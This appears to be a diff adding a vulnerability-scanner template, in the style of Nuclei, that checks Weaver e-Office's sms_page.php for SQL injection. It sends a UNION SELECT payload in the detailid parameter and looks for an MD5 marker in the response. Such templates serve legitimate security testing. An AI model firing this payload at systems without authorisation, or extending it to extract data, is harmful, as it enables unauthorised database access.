@@ -1,0 +1,32 @@
+id: e-office-sms-page-sqli
+
+info:
+  name: SQL Injection in e-Office sms_page.php
+  author: onewin
+  severity: high
+  description: |
+    Possible SQL Injection vulnerability in e-Office's sms_page.php allowing attackers to execute arbitrary SQL queries.
+  tags: 泛微-EOffice,泛微-协同办公OA
+
+http:
+  - raw:
+      - |
+        GET /E-mobile/sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x7e,md5(123),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+      - |
+        GET /sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x7e,md5(123),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70" # MD5 hash of 123
+        part: body
+
+      - type: status
+        status:
+          - 200
